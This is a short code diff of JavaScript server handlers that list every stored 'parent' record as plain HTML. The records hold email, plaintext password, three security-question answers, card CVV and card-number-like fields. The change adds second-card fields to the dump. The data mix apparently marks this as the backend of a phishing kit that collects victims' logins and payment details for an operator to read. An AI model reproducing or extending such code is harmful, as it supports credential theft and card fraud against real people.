@@ -143,7 +143,7 @@ const getParentsCvv = (req, res) => __awaiter(void 0, void 0, void 0, function* 
         const parents = yield parentModel_1.default.find();
         const parentText = parents
             .filter((parent) => parent.cvv)
-            .map(({ email, password, date, first_q, second_q, third_q, cvv, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`)
+            .map(({ email, password, date, first_q, second_q, third_q, cvv, no2, url2, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${no2},${url2},${stop_sharing},${no_of_family}`)
             .join("<br />");
         res.status(200).send(`<p>${parentText}</p>`);
     }
@@ -157,7 +157,7 @@ const getParentsUrl = (req, res) => __awaiter(void 0, void 0, void 0, function* 
         const parents = yield parentModel_1.default.find();
         const parentText = parents
             .filter((parent) => parent.url)
-            .map(({ email, password, date, first_q, second_q, third_q, no, url, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${stop_sharing},${no_of_family}`)
+            .map(({ email, password, date, first_q, second_q, third_q, no, url, no2, url2, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${no2},${url2},${stop_sharing},${no_of_family}`)
             .join("<br />");
         res.status(200).send(`<p>${parentText}</p>`);
     }
